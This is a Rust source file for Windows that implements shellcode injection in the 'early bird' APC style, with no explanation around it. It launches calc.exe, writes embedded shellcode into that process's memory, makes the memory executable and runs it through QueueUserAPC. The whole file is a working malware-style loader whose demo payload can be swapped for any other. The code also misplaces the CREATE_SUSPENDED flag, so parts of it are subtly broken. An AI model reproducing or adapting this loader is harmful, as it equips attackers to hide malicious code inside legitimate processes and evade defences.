use std::mem::{transmute, zeroed};
use std::ptr::{null, null_mut};
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, FALSE, TRUE};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{
    CreateProcessA, QueueUserAPC, ResumeThread, CREATE_NO_WINDOW, CREATE_SUSPENDED,
    PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA,
};

#[cfg(target_os = "windows")]
fn main() {
    let shellcode = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
    let shellcode_size = shellcode.len();
    let program = b"C:\\Windows\\System32\\calc.exe\0";

    unsafe {
        let mut pi: PROCESS_INFORMATION = zeroed();
        let mut si: STARTUPINFOA = zeroed();
        si.dwFlags = STARTF_USESTDHANDLES | CREATE_SUSPENDED;
        si.wShowWindow = 0;

        let res = CreateProcessA(
            program.as_ptr(),
            null_mut(),
            null(),
            null(),
            TRUE,
            CREATE_NO_WINDOW,
            null(),
            null(),
            &si,
            &mut pi,
        );
        if res == FALSE {
            panic!("[-]CreateProcessA failed: {}!", GetLastError());
        }

        let addr = VirtualAllocEx(
            pi.hProcess,
            null(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            panic!("[-]VirtualAllocEx failed: {}!", GetLastError());
        }

        let res = WriteProcessMemory(
            pi.hProcess,
            addr,
            shellcode.as_ptr().cast(),
            shellcode_size,
            null_mut(),
        );
        if res == FALSE {
            panic!("[-]WriteProcessMemory failed: {}!", GetLastError());
        }

        let mut old = PAGE_READWRITE;
        let res = VirtualProtectEx(pi.hProcess, addr, shellcode_size, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("[-]VirtualProtectEx failed: {}!", GetLastError());
        }

        let func = transmute(addr);
        let res = QueueUserAPC(Some(func), pi.hThread, 0);
        if res == 0 {
            panic!("[-]QueueUserAPC failed: {}!", GetLastError());
        }
        let res = ResumeThread(pi.hThread);
        if res == 0u32 {
            panic!("[-]ResumeThread failed: {}!", GetLastError());
        }

        let res = CloseHandle(pi.hProcess);
        if res == FALSE {
            panic!("[-]CloseHandle failed: {}!", GetLastError());
        }

        let res = CloseHandle(pi.hThread);
        if res == FALSE {
            panic!("[-]CloseHandle failed: {}!", GetLastError());
        }
    }
}
